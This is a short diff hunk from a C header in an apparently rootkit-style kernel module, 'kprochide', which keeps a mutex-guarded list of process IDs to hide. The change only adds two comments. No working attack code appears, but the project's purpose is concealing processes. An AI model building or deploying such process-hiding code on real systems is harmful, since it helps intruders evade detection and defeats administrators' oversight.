@@ -14,7 +14,10 @@ struct pid_to_hide {
     struct list_head l_head;
 };
 
+// mutex to avoid race-conditions while accessing the list.
 extern struct mutex kprochide_pids_to_hide_mutex;
+
+// list of pids to hide.
 extern struct list_head kprochide_pids_to_hide;
 
 // register and unregister the char device.
